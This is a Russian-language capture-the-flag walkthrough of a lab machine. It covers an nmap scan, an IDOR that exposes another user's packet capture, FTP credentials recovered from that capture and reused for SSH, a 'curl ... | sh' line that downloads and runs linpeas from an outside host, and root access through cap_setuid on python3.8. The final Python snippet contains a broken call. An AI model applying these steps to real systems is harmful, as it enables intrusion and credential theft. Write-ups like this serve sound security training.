
1 Сколько портов TCP открыто?
при сканировании утилитой `nmap -sS -sV -A <target-ip>` было выявлено 3 порта 21,22,80

![Сканирование машины ](../assets/nmap_scan_cap.png)
ответ: 3

2 После запуска «Security Snapshot» браузер перенаправляется на путь в формате `/[что-то]/[id]`, где `[id]` представляет собой идентификационный номер сканирования. Что такое `[что-то]`?

при переходе на `<target-ip>:80` мы попадаем на сайт который позволяет делать снапшоты безопасности переходим на вкладку "Security Snapshot" и видим что в url адресе теперь такой `http://<target-ip>/data/1` пробуем поменять пользователя с `id` 1 на `id` 0.

WebUI сканер 
![WebUI сканер](../assets/webui_cap.png)
ответ: data

3 Есть ли у вас доступ к сканам других пользователей?

после смены пользователя на `id` 0 мы попадаем в админ панель где видим множество пакетов скачиваем их

movement between users 
![movement between users](../assets/admin_webui_cap.png)
ответ: да

4 Какой идентификатор файла PCAP, содержащего конфиденциальные данные?
Admin panel 
![Admin panel](../assets/admin_webui_cap.png)
ответ: 0

5 В каком протоколе прикладного уровня в файле pcap можно найти важные данные?

применив фильтрацию по ftp пакетам в `Wireshark` мы видем имя и пароль пользователя а имено nathan:Buck3tH4TF0RM3!

Wireshark data 
![Wireshark data](../assets/find_username_cap.png)
![](../assets/find_password_cap.png)
ответ: ftp

6 Нам удалось получить пароль Нейтана для FTP. На каком еще сервисе этот пароль работает?

зная что у нас есть ещё и 22 порт отвечающий за ssh пробуем подключиться к нему с имеющимися у нас логином и паролем

![ssh_session](../assets/get_ssh_session_cap.png)
ответ: ssh

7 Отправьте флаг, расположенный в домашнем каталоге пользователя nathan.

флаг можно получить как через ftp так и по ssh через ftp `get user.txt` и на системе `cat user.txt` а через ssh `cat user.txt` и флаг появится в терминале

User flag 
![User flag](../assets/get_user_flag.png)
![](../assets/userflag_view_cap.png)
флаг пользователя получен

8 Какой полный путь к двоичному файлу на этом компьютере есть специальные возможности, которыми можно злоупотреблять для получения root-прав?

для обноружения уязвимостей на машине воспользуемся `linpease.sh` поднимаем сервер командой `python3 -m http.server <port>` после чего скачиваем  `linpease.sh` в отдельную папку где подняли сервер после чего на машине запускаем `linpease.sh` командой `curl http://<openvpn_ip>/linpease.sh | sh` таким образом мы даём понять чтобы система не только скачала файл но и запустила его по завершению скачивания.

start python http server 
![](../assets/python_server_cap.png)
![](../assets/get_linpeas_cap.png)
![](../assets/start_linpease_cap.png)
![](../assets/find_vulnerability.png)
после завершения работы `linpease.sh` ищем `cap_setuid` который находим в бинарном файле `python3.8`

ответ: python3.8

9 Отправьте флаг, расположенный в домашнем каталоге root.

теперь запускаем python консоль и прописываем такую команду и получаем доступ к root пользователю после чего выводим флаг в терминал
```
import os
os.setuid(0)
os.spawn("/bin/bash")
```

![Privilege Escalation](../assets/get_root.png)
![](../assets/get_root_flag.png)

флаг root получен
